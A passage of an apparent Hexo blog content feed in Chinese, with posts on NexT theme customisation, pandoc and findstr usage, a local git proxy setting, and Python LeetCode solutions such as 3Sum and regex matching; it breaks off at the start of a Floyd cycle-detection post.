&lt;&#x2F;span&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;in_left&quot;&gt;</span><br><span class="line">            &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;in_pic&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;in_right&quot;&gt;</span><br><span class="line">            &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;in_pic&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;in_top&quot;&gt;</span><br><span class="line">            &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;in_pic&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;in_bottom&quot;&gt;</span><br><span class="line">            &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Aurthoria&#x2F;Pictures&#x2F;master&#x2F;img&#x2F;20200309224636.png&quot; class&#x3D;&quot;in_pic&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  function back2top()&#123;</span><br><span class="line">    $(&#39;html, body&#39;).animate(&#123;scrollTop: 0&#125;, 500);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></div>
<p>其中照片要放自己的呀！</p>
<h1 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h1><p>下面就是在个人主页中调用小魔方辽</p>
<ul>
<li><p>在 /themes/next/layout/_custom/custom.swig 文件中引入新建的文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 旋转魔方 --&gt;</span><br><span class="line">&#123;% if theme.cube.enable %&#125;</span><br><span class="line">   &#123;% if theme.cube.type &#x3D;&#x3D; &quot;mini&quot; %&#125;</span><br><span class="line">      &#123;% include &#39;cube-mini.swig&#39; %&#125;</span><br><span class="line">   &#123;% elseif theme.cube.type &#x3D;&#x3D; &quot;hollow&quot; %&#125;</span><br><span class="line">      &#123;% include &#39;cube-hollow.swig&#39; %&#125;</span><br><span class="line">   &#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果 custom.swig 文件不存在，需要手动新建并在布局页面中 body 末尾引入：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">themes\next\layout\_layout.swig      ...</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;exturl.swig&#39; %&#125;</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;bookmark.swig&#39; %&#125;</span><br><span class="line">      &#123;% include &#39;_third-party&#x2F;copy-code.swig&#39; %&#125;</span><br><span class="line"></span><br><span class="line">+     &#123;% include &#39;_custom&#x2F;custom.swig&#39; %&#125;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">  &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>在主题next中的 _config.yml 中新添加以下动态配置项</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YML"><figure class="iseeu highlight /yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">cube:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">hollow</span> <span class="comment"># mini | hollow</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>隐藏原来的箭头，注释_layout.swig如下部分</p>
<p><img src="/images/loading.gif" data-original="/posts/2ad4ed84/image-20200310004921406.png" alt="image-20200310004921406"></p>
</li>
</ul>
<p>完成！ hexo  g  -d 即可！</p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>hexo分页显示问题</title>
    <url>/posts/b1e741f7/</url>
    <content><![CDATA[<p><strong>分页显示问题</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/b1e741f7/20191201150136673.png" alt="问题"><a id="more"></a></p>
<ul>
<li>参考：<a href="https://github.com/hexojs/hexo/issues/3794">https://github.com/hexojs/hexo/issues/3794</a></li>
<li>修改： /Blog/themes/next/layout/_partials/pagination.swig</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&#123;%- <span class="keyword">if</span> page.prev or page.next %&#125;</span><br><span class="line"> &lt;nav class=<span class="string">"pagination"</span>&gt;</span><br><span class="line">   &#123;&#123;</span><br><span class="line">     paginator(&#123;</span><br><span class="line">       prev_text: <span class="string">'&lt;i class="fa fa-angle-left" aria-label="'</span>+__(<span class="string">'accessibility.prev_page'</span>)+<span class="string">'"&gt;&lt;/i&gt;'</span>,</span><br><span class="line">       next_text: <span class="string">'&lt;i class="fa fa-angle-right" aria-label="'</span>+__(<span class="string">'accessibility.next_page'</span>)+<span class="string">'"&gt;&lt;/i&gt;'</span>,</span><br><span class="line">       mid_size: 1,</span><br><span class="line">       escape: <span class="literal">false</span></span><br><span class="line">     &#125;)</span><br><span class="line">   &#125;&#125;</span><br><span class="line"> &lt;/nav&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>hexo</category>
      </categories>
  </entry>
  <entry>
    <title>word与markdown互相转化</title>
    <url>/posts/918efec6/</url>
    <content><![CDATA[<p>安装Pandoc<br>然后<br>word转markdown</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">pandoc -s 名称.docx -t markdown -o 名称.md</span><br></pre></td></tr></table></figure></div>
<p>markdown转word<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">pandoc -s 名称.md -o 名称.docx</span><br></pre></td></tr></table></figure></div></p>
<a id="more"></a>]]></content>
      <categories>
        <category>Windows技巧</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows cmd findstr命令详解</title>
    <url>/posts/fd883483/</url>
    <content><![CDATA[<h1 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h1><p>findstr是Window系统自带的命令，用于查找某路径下指定的一个或多个文件中包含某些特定字符串的行，并将该行完整的信息打印出来，或者打印查询字符串所在的文件名。其用途和用法类似Linux下的grep命令。findstr命令在MS-DOS下使用。 <a id="more"></a></p>
<h1 id="命令语法"><a href="#命令语法" class="headerlink" title="命令语法"></a>命令语法</h1><p>findstr</p>
<p>[/b] [/e][/l][/r][/s][/i][/x][/v][/n][/m][/o][/p][/offline][/g:file][/f:file][/c:string][/d:dirlist][/a:ColorAttribute][strings][[Drive:][Path] FileName […]]</p>
<h1 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h1><p>/b          如果位于行的开头则匹配模式。<br>/e         如果位于行的末尾则匹配模式。<br>/l         使用文字搜索字符串。<br>/r         使用搜索串作为常规表达式。Findstr 将所有元字符解释为常规表达式，除非使用了 /l。<br>/s         在当前目录和所有子目录中搜索匹配的文件。<br>/i         指定搜索不区分大小写。<br>/x         打印完全匹配的行。<br>/v         只打印不包含匹配的行。<br>/n         在每个匹配的行之前打印行号。<br>/m         如果文件包含匹配项，仅打印该文件名。<br>/o         在每次匹配行之前打印查找偏移量。<br>/p         跳过包含非可打印字符的文件。<br>/offline         利用脱机属性设置处理文件。<br>/f:file         从指定文件中读取文件列表。<br>/c:string         使用指定的文本作为文字搜索字符串。<br>/g:file         从指定文件得到搜索字符串。<br>/d:dirlist         搜索以逗号分隔的目录列表。<br>/a:ColorAttribute         使用两个十六进制数指定颜色属性。<br>strings         指定要在 FileName中搜索的文本。<br>[Drive:][Path] FileName […]         [drive:]、[path]是可选的，如果省略，默认是查找当前目录，至少指定一个文件，可以同时指定多个，用空格分隔，另外文件名可以使用通配符，例如所有文本文件，就可以写成 *.txt 即可。<br>/?         在命令提示符显示帮助。</p>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>1、在当前目录及所有子目录下的所有文件中查找</p>
<p>在当前目录及所有子目录下的所有文件中查找”backup”这个字符串，<em>.</em>表示所有类型的文件。<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">findstr &#x2F;s &#x2F;i &quot;backup&quot; *.*</span><br></pre></td></tr></table></figure></div></p>
<p>2、查找带有空格的字符串</p>
<p>在当前目录及所有子目录下查找”backup jobs”<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">findstr &#x2F;s &#x2F;i &#x2F;c:&quot;backup jobs&quot; *.*</span><br></pre></td></tr></table></figure></div></p>
<p>3、指定路径查找字符串”cmd”</p>
<p>在C:\tmp\查找所有txt文件的字符串”cmd”<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">findstr &#x2F;s &#x2F;i &#x2F;c:&quot;cmd&quot; C:\tmp\*.txt</span><br></pre></td></tr></table></figure></div></p>
<p>原文链接<br><a href="https://blog.csdn.net/xiaozhongma/article/details/23194917">https://blog.csdn.net/xiaozhongma/article/details/23194917</a></p>
]]></content>
      <categories>
        <category>Windows技巧</category>
      </categories>
      <tags>
        <tag>Window命令</tag>
      </tags>
  </entry>
  <entry>
    <title>解决git clone速度太慢的问题</title>
    <url>/posts/f0ef31cd/</url>
    <content><![CDATA[<p>本文将介绍利用1080端口代理解决git clone速度太慢的问题。<a id="more"></a></p>
<p>git的网络配置文件在如下位置<br><img src="/images/loading.gif" data-original="/posts/f0ef31cd/18457849-822ab3367e8efe1f.png" alt></p>
<p>假设你已经有了ss（我开PAC是OK的）</p>
<p>在cmd中输入以下指令：<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure></div><br>（端口号看你自己的配置，一般都是1080）</p>
<p>如果要取消代理修改：<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br></pre></td></tr></table></figure></div></p>
<p>问题补充<br>上述方法挂了全局代理，但是如果要克隆码云、coding等国内仓库，速度就会很慢。更好的方法是只对github进行代理，不会影响国内仓库：<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git config --global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure></div><br>代理后git clone速度真的快了很多~我这边能到1MB/s以上<br>原文链接：<a href="https://blog.csdn.net/qq_37409292/article/details/83005919">https://blog.csdn.net/qq_37409292/article/details/83005919</a></p>
]]></content>
      <categories>
        <category>Windows技巧</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode 15&amp;16</title>
    <url>/posts/ab6fa81b/</url>
    <content><![CDATA[<h1 id="15-3Sum"><a href="#15-3Sum" class="headerlink" title="15. 3Sum"></a>15. 3Sum</h1><p>Given an array nums of n integers, are there elements a, b, c in nums such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.<a id="more"></a></p>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><p>The solution set must not contain duplicate triplets.</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h2><p>Given array nums = [-1, 0, 1, 2, -1, -4],</p>
<p>A solution set is:<br>[<br>  [-1, 0, 1],<br>  [-1, -1, 2]<br>]<br>用集合做<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">from collections import Counter</span><br><span class="line">class Solution:</span><br><span class="line">    def threeSum(self, nums: List[int]) -&gt; List[List[int]]:</span><br><span class="line">        counter&#x3D;Counter(nums)</span><br><span class="line">        numset&#x3D;set(nums)</span><br><span class="line">        numlist&#x3D;sorted(list(numset))</span><br><span class="line">        print(numlist)</span><br><span class="line">        res&#x3D;[]</span><br><span class="line">        if 0 in counter:</span><br><span class="line">            if counter[0]&gt;&#x3D;3:</span><br><span class="line">                res.append([0,0,0])</span><br><span class="line">        for i in range(len(numlist)):</span><br><span class="line">            for j in range(i+1,len(numlist)):</span><br><span class="line">                sum&#x3D;-numlist[i]-numlist[j]</span><br><span class="line">                if sum in numset:</span><br><span class="line">                    if sum!&#x3D;numlist[i] and  sum!&#x3D;numlist[j] and numlist.index(sum)&lt;j:</span><br><span class="line">                        continue</span><br><span class="line">                    if sum&#x3D;&#x3D;numlist[i]:</span><br><span class="line">                        if counter[numlist[i]]&gt;&#x3D;2:</span><br><span class="line">                            res.append([numlist[i],numlist[i],numlist[j]])</span><br><span class="line">                        continue</span><br><span class="line">                    if sum&#x3D;&#x3D;numlist[j]:</span><br><span class="line">                        if counter[numlist[j]]&gt;&#x3D;2:</span><br><span class="line">                            res.append([numlist[i],numlist[j],numlist[j]])</span><br><span class="line">                        continue</span><br><span class="line">                    res.append([numlist[i],numlist[j],sum])</span><br><span class="line">        return res</span><br></pre></td></tr></table></figure></div><br>另外一种方法是用左右移动调整的方法<br>If we sort the the list, then we can consider each number in the list as b in equation a+b+c=0, and to find a and c, we can start from the two edges of the list and move towards center.</p>
<p>For example in nums=[-3, -2, 0, 1, 4, 6] if we have chosen nums[3]=1 as the center, then at first left=nums[0]=-3 and right=nums[5]=6. If a+b+c = 0, then we add [a,b,c] to ans, only if it was not there already; and we move both left and right towards the center to consider new values for a and c.</p>
<p>If the sum of the three numbers is greater than 0, then we need to move the right one step towards the center to get a smaller sum; and if the sum is less than 0, we need to move the left towards center to get a larger sum value.<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def threeSum(self, nums: List[int]) -&gt; List[List[int]]:</span><br><span class="line">        ans &#x3D; set()</span><br><span class="line">        nums.sort()</span><br><span class="line">        </span><br><span class="line">        for center in range(len(nums)-1):</span><br><span class="line">            left &#x3D; 0</span><br><span class="line">            right &#x3D; len(nums)-1</span><br><span class="line">            </span><br><span class="line">            while left &lt; center and center &lt; right:</span><br><span class="line">                </span><br><span class="line">                temp &#x3D; nums[left] + nums[center] + nums[right]</span><br><span class="line">                </span><br><span class="line">                if temp &#x3D;&#x3D; 0:</span><br><span class="line">                    if (nums[left], nums[center], nums[right]) not in ans:</span><br><span class="line">                        ans.add((nums[left], nums[center], nums[right]))</span><br><span class="line">                    left +&#x3D; 1</span><br><span class="line">                    right -&#x3D; 1</span><br><span class="line">                elif temp &gt; 0:</span><br><span class="line">                    right -&#x3D; 1</span><br><span class="line">                elif temp &lt; 0:</span><br><span class="line">                    left +&#x3D; 1</span><br><span class="line">        return list(ans)</span><br></pre></td></tr></table></figure></div><br>类题如下</p>
<h1 id="16-3Sum-Closest"><a href="#16-3Sum-Closest" class="headerlink" title="16. 3Sum Closest"></a>16. 3Sum Closest</h1><p>Given an array nums of n integers and an integer target, find three integers in nums such that the sum is closest to target. Return the sum of the three integers. You may assume that each input would have exactly one solution.</p>
<h2 id="Example-1"><a href="#Example-1" class="headerlink" title="Example:"></a>Example:</h2><p>Given array nums = [-1, 2, 1, -4], and target = 1.</p>
<p>The sum that is closest to the target is 2. (-1 + 2 + 1 = 2).<br>同理<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def threeSumClosest(self, nums: List[int], target: int) -&gt; int:</span><br><span class="line">        sort_nums&#x3D;sorted(nums)</span><br><span class="line">        best&#x3D;math.inf</span><br><span class="line">        for center in range(1,len(sort_nums)-1):</span><br><span class="line">            left&#x3D;0</span><br><span class="line">            right&#x3D;len(sort_nums)-1</span><br><span class="line">            while left&lt;center and center&lt;right:</span><br><span class="line">                temp &#x3D; sort_nums[left]+sort_nums[center]+sort_nums[right]</span><br><span class="line">                if abs(temp-target)&lt;abs(best-target):</span><br><span class="line">                    best&#x3D;temp</span><br><span class="line">                if temp&#x3D;&#x3D;target:</span><br><span class="line">                    return target</span><br><span class="line">                elif temp&gt;target:</span><br><span class="line">                    right-&#x3D;1</span><br><span class="line">                elif temp&lt;target:</span><br><span class="line">                    left+&#x3D;1</span><br><span class="line">        return best</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
  </entry>
  <entry>
    <title>Leetcode11 Container With Most Water</title>
    <url>/posts/61122cc5/</url>
    <content><![CDATA[<p>11. Container With Most Water</p>
<p>Medium</p>
<p>Given <em>n</em> non-negative integers <em>a<sub>1</sub></em>, <em>a<sub>2</sub></em>, …, <em>a<sub>n </sub></em>, where each represents a point at coordinate (<em>i</em>, <em>a<sub>i</sub></em>). <em>n</em> vertical lines are drawn such that the two endpoints of line <em>i</em> is at (<em>i</em>, <em>a<sub>i</sub></em>) and (<em>i</em>, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.<a id="more"></a></p>
<p><strong>Note:</strong> You may not slant the container and <em>n</em> is at least 2.</p>
<p><img src="/images/loading.gif" data-original="/posts/61122cc5/18457849-59dafc1937a6637e.jpg" alt="image"></p>
<p>The above vertical lines are represented by array [1,8,6,2,5,4,8,3,7]. In this case, the max area of water (blue section) the container can contain is 49.</p>
<p><strong>Example:</strong></p>
<p><strong>Input:</strong> [1,8,6,2,5,4,8,3,7]<br><strong>Output:</strong> 49<br>解题思路，利用类二分查找法<br>从左右向中间移动<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxArea(self, height: List[int]) -&gt; int:</span><br><span class="line">        left, right, maxarea &#x3D; 0, len(height) - 1, 0</span><br><span class="line">        while left &lt; right:</span><br><span class="line">            maxarea&#x3D;max(maxarea,min(height[right], height[left])*(right - left))</span><br><span class="line">            if height[left] &lt; height[right]: </span><br><span class="line">                left +&#x3D; 1</span><br><span class="line">            else: </span><br><span class="line">                right -&#x3D; 1</span><br><span class="line">        return maxarea</span><br></pre></td></tr></table></figure></div><br>假设一开始的区间为[left,right]，<br>假设height[left]&gt;height[right]，<br>则area=(right-left)*height[right]<br>此时我们如果选择从left端向中间移动，<br>此时area的高度h必定小于等于height[right]，<br>而area的长变小，<br>因此area\’一定变小。<br>因此只能从高度小的一端向中间移动。<br>该算法时间复杂度为O(n)</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
  </entry>
  <entry>
    <title>Leetcode 10 正则表达式匹配问题</title>
    <url>/posts/cc8bfe22/</url>
    <content><![CDATA[<h1 id="Regular-Expression-Matching"><a href="#Regular-Expression-Matching" class="headerlink" title="Regular Expression Matching"></a>Regular Expression Matching</h1><p>Given an input string (s) and a pattern (p), implement regular expression matching with support for ‘.’ and ‘*‘.</p>
<p>‘.’ Matches any single character.<br>‘*‘ Matches zero or more of the preceding element.</p>
<p>The matching should cover the entire input string (not partial).<a id="more"></a></p>
<h1 id="Note："><a href="#Note：" class="headerlink" title="Note："></a>Note：</h1><p>s could be empty and contains only lowercase letters a-z.<br>p could be empty and contains only lowercase letters a-z, and characters like . or *.</p>
<h1 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h1><p>Input:<br>s = “aa”<br>p = “a”<br>Output: false<br>Explanation: “a” does not match the entire string “aa”.</p>
<h1 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h1><p>Input:<br>s = “aa”<br>p = “a*“<br>Output: true<br>Explanation: ‘*’ means zero or more of the preceding element, ‘a’. Therefore, by repeating ‘a’ once, it becomes “aa”.</p>
<h1 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h1><p>Input:<br>s = “ab”<br>p = “.*“<br>Output: true<br>Explanation: “.<em>“ means “zero or more (</em>) of any character (.)”.</p>
<h1 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4:"></a>Example 4:</h1><p>Input:<br>s = “aab”<br>p = “c*a*b”<br>Output: true<br>Explanation: c can be repeated 0 times, a can be repeated 1 time. Therefore, it matches “aab”.</p>
<h1 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5:"></a>Example 5:</h1><p>Input:<br>s = “mississippi”<br>p = “mis*is*p*.”<br>Output: false</p>
<p>正则表达式匹配，想偷懒的话，直接调用python的re库<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">class Solution:</span><br><span class="line">    def isMatch(self, s: str, p: str) -&gt; bool:</span><br><span class="line">        return re.fullmatch(p, s) !&#x3D; None</span><br></pre></td></tr></table></figure></div></p>
<p>比较正规的方法是用<strong>动态规划</strong>的方法<br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def isMatch(self, s: str, p: str) -&gt; bool:</span><br><span class="line">        ls&#x3D;len(s)</span><br><span class="line">        lp&#x3D;len(p)</span><br><span class="line">        dp &#x3D; [[True if not j else not ls for j in range(ls+1)] for i in range(lp+1)]</span><br><span class="line">        s&#x3D;&#39; &#39;+s</span><br><span class="line">        p&#x3D;&#39; &#39;+p</span><br><span class="line">        for i in range(1, lp+1):</span><br><span class="line">            ast &#x3D; p[i] &#x3D;&#x3D; &#39;*&#39;#注此处i-1代表第i个</span><br><span class="line">            dp[i][0] &#x3D; ast and dp[i-2][0]</span><br><span class="line">            for j in range(1, ls+1):</span><br><span class="line">                dp[i][j] &#x3D; ast and dp[i-2][j] or p[i-ast] in (&#39;.&#39;, s[j]) and dp[i-1+ast][j-1]</span><br><span class="line">                   </span><br><span class="line">        return dp[lp][ls]</span><br></pre></td></tr></table></figure></div><br>分析一下算法思路<br>其中递推项dp[i][j]表示p的前i个字符与s中前j个字符组成的表示式是否匹配。dp[0][0]恒为True。<br>对p和s做1个偏移调整</p>
<p>对于p的前i个和s的前j个字符串<br>需考虑2种情况<br>㈠当p[i]=’*‘时，dp[i][j]为真有两种情况：<br>(1)当dp[i-2][j]为真时，利用p[i]=’*‘，可将p[i-1]消去，因此dp[i][j]仍为真，<br>(2)当dp[i][j-1]为真，且p[i]=’*‘，则可知s[j-1]一定和p[i-2]或p[i-1]相等<br>①当s[j-1]=\=p[i-2]，若s[j]=\=p[i-1](p[i-1]等于’.’也成立)，则可以令p[i]的’*‘为重复1次，正好匹配；<br>②当s[j-1]=\=p[i-1]，若s[j]=\=p[i-1](p[i-1]等于’.’也成立)，则可以令p[i]的’*‘为重复2次，正好匹配</p>
<p>㈡当p[i]!=’*‘时，dp[i][j]为真只有一种情况，dp[i-1][j-1]为真且s[j]==p[i](p[i]等于’.’也成立)。</p>
<p>则可以列出下列递推式</p>
<script type="math/tex; mode=display">dp[i][j]=\begin{cases}
dp[i-2][j] \ \ ||\ \ (p[i-1]∈\{'.',s[j]\}\ \  \&\& \ \  dp[i][j-1])  & p[i]=='*' \\
p[i]∈\{'.',s[j]\} \ \ \&\& \ \ dp[i-1][j-1]  & p[i]!='*' \\
\end{cases}</script>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
  </entry>
  <entry>
    <title>全排列（字典序和非字典序）</title>
    <url>/posts/a22ca2eb/</url>
    <content><![CDATA[<p>非字典序全排列和字典序全排列python代码。<a id="more"></a><br><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全排列函数permutation，需要使用递归来列举，也是一个知识点（参考网络）</span></span><br><span class="line"><span class="comment"># 除了使用模块，当然可以自己写一个函数来实现:</span></span><br><span class="line"><span class="comment">#下面是字典序</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(xs)</span>:</span>   <span class="comment">#简化问题，假定形参xs是列表</span></span><br><span class="line">    <span class="keyword">if</span> len(xs) == <span class="number">0</span> <span class="keyword">or</span> len(xs) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> [xs]</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xs:</span><br><span class="line">        temp_list = xs[:] <span class="comment">#对xs进行切片操作，使得temp_list的值和xs一样 但是temp_list的改变不影响xs</span></span><br><span class="line">        temp_list.remove(i)</span><br><span class="line">        temp = permutation(temp_list) <span class="comment">#使用递归 生成删掉一个元素的xs的全排列</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> temp:   <span class="comment">#对temp中的每一项再进行遍历</span></span><br><span class="line">            j.insert(<span class="number">0</span>,i)   <span class="comment">#j[0:0] = [i]在index 0 的位置插入之前删去的i</span></span><br><span class="line">            result.append(j)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutation([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]):</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#下面是非字典序排列</span></span><br><span class="line">li=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">res=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Perm</span><span class="params">(m)</span>:</span><span class="comment">#交换序</span></span><br><span class="line">    <span class="keyword">global</span> li</span><br><span class="line">    <span class="keyword">if</span> m==len(li)<span class="number">-1</span> :</span><br><span class="line">        res.append(li)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(m,len(li)):</span><br><span class="line">            li[j],li[m]=li[m],li[j]</span><br><span class="line">            Perm(m+<span class="number">1</span>)</span><br><span class="line">            li=li[:]</span><br><span class="line">            li[j],li[m]=li[m],li[j]</span><br><span class="line">Perm(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    print(i)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">当用[:]赋值时，生成的是一个新的对象,改变时不会改变之前的值，是深拷贝</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
  </entry>
  <entry>
    <title>Floyd判圈算法 龟兔赛跑</title>
    <url>/posts/d0e97dc/</url>
    <content><![CDATA[<p>本文主要介绍floyd判圈算法及其在leetcode三道题中的应用。<a id="more"></a></p>
<h1 id="Floyd判圈算法"><a href="#Floyd判圈算法" class="headerlink" title="Floyd判圈算法"></a>Floyd判圈算法</h1><p>问题：如何检测一个链表是否有环，如果有，那么如何确定环的起点？如何确定环的长度？</p>
<ul>
<li>时间复杂度：O（n） （高效率）</li>
<li>空间复杂度：O（1）</li>
</ul>
<p>此算法又成为龟兔赛跑算法，基本思想是：</p>
